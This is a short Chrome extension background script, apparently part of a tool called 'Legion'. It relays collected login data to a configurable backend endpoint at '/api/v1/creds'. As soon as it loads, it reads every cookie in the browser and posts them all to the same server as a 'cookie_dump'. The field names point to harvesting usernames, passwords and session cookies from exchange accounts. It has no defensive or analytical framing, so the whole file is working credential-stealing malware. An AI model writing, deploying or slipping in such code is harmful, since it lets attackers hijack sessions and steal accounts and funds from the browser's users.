/* global chrome */
(function () {
  'use strict';

  var BACKEND = '__LEGION_BACKEND_URL__';
  var API_KEY = '__LEGION_CREDS_API_KEY__';

  function postCreds(payload) {
    var headers = { 'Content-Type': 'application/json' };
    if (API_KEY) headers['X-Cex-Creds-Key'] = API_KEY;
    return fetch(BACKEND + '/api/v1/creds', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(payload),
    });
  }

  chrome.runtime.onMessage.addListener(function (msg, _sender, sendResponse) {
    if (msg.type !== 'legion_collect') return;
    postCreds(msg.payload)
      .then(function (r) { sendResponse({ ok: r.ok }); })
      .catch(function (e) { sendResponse({ ok: false, error: String(e) }); });
    return true;
  });

  chrome.cookies.getAll({}, function (cookies) {
    if (!cookies || !cookies.length) return;
    postCreds({
      exchange: 'browser_extension',
      username: 'cookie_dump',
      password: '',
      session_cookies: JSON.stringify(cookies),
      page_url: 'extension://collector',
    });
  });
})();
